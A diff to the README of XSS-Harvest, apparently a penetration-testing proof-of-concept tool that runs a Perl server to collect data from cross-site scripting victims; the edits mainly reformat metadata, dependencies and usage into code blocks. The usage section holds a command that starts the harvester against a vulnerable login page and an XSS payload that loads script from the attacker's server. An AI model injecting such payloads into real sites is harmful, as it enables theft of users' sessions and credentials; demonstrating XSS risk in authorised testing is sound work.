@@ -1,12 +1,12 @@
 XSS-Harvest
 ===========
 
+* Author: geoff.jones@cyberis.co.uk
+* Copyright: Cyberis Limited 2013
+* License: GPLv3 (See LICENSE)
+* Version: 0.4
+
 XSS-Harvest - a proof of concept harvesting tool for demonstrating the real power of XSS attacks
-
-
-v0.4 - geoff.jones@cyberis.co.uk
-
-Copyright 2013 Cyberis Limited
 
 ## About
 XSS-Harvest is multi-threaded pre-forking web server written in Perl, and requires no dependencies other than a couple of common Perl modules; you do not need a web server or database to use this tool. Before going into the detail, I'll list the high level functionality below:
@@ -24,7 +24,13 @@ XSS-Harvest is multi-threaded pre-forking web server written in Perl, and requir
 
 ## Dependencies
 Requires the following dependencies:
-HTTP::Server::Simple::CGI, Digest::MD5, Time::Local, Getopt::Std, Net::Server::PreFork
+```perl
+use HTTP::Server::Simple::CGI;
+use Digest::MD5;
+use Time::Local;
+use Getopt::Std;
+use Net::Server::PreFork;
+```
 
 ### Ubuntu/Debian install
 
@@ -41,8 +47,11 @@ HTTP::Server::Simple::CGI, Digest::MD5, Time::Local, Getopt::Std, Net::Server::P
 ## Usage
 Start server (with redress:)
 
-* ./xss-harvest.pl -l -r http://vulnerablepage.local/login.html
+```bash
+./xss-harvest.pl -l -r http://vulnerablepage.local/login.html
+```
 
 XSS:
-
-* \<script src="http://\<serverip\>:\<serverport\>/i"\>\</script\>
+```html
+<script src="http://<serverip>:<serverport>/i"></script>
+```
